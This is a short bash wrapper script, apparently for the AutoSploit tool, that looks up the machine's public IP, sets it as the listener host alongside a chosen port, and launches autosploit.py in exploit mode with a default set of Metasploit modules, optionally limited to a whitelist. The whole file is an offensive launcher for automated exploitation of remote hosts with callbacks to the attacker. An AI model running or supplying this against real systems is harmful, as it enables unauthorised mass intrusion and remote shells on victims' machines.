#!/bin/bash


if [[ $# -lt 1 ]]; then
    echo "Syntax:"
    echo -e "\t./run_autosploit.sh PORT [WHITELIST]"
	exit 1
fi

echo -e "[!] Make sure you are not on your localhost while running this script, press enter to continue";
read

WHITELIST=$2
LPORT=$1

LHOST=`dig +short @resolver1.opendns.com myip.opendns.com`
TIMESTAMP=`date +%s`

if [[ ! $WHITELIST ]]; then
  python autosploit.py -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT -f etc/json/default_modules.json
else
  python autosploit.py --whitelist $WHITELIST -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT -f etc/json/default_modules.json
fi;